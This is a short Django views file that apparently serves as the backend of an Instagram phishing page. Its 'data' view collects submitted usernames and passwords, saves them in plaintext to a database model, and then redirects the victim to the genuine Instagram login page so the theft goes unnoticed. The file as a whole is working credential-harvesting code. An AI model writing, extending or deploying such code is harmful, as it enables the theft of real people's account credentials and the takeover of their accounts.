from django.shortcuts import render,redirect
from .models import userdetail
from django.http import HttpResponseRedirect
from django.contrib.auth.models import User

import time
from django.views import View
# Create your views here.

def home(request):
    return render(request,'home.html')

def data(request):
    usern=request.POST.get('username')
    passw=request.POST.get('password')
    dat=userdetail(username=usern,password=passw)
    dat.save()
    
    
    #return HttpResponseRedirect(driver.current_url)
    #return render(request,'thanks.html')
    return HttpResponseRedirect("https://www.instagram.com/accounts/login/")

